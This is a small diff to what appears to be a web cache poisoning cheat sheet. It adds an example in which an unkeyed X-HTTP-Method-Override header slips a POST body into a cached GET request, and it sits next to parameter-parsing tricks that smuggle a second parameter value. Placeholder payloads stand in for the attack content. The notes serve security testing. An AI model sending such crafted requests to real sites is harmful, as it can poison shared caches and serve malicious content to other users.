@@ -10,4 +10,12 @@ Exploiting parameter parsing quirks:
      GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
      GET /?example=123?excluded_param=bad-stuff-here
 
+X-HTTP-Method-Override header is unkeyed:
+     GET /?param=innocent HTTP/1.1
+     Host: innocent-website.com
+     X-HTTP-Method-Override: POST
+     …
+     param=bad-stuff-here
+
+
 
